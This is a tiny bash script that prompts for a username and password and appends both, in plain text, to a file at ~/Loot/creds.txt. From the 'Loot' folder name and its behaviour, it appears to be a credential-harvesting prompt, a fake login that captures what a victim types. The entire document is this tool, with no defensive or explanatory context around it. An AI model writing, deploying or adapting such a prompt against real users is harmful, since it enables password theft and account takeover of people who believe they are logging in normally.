#!/bin/bash
read -p "Enter username: " username
read -p "Enter password: " password
echo
# Write to creds.txt
echo "'$username':'$password'" >> ~/Loot/creds.txt
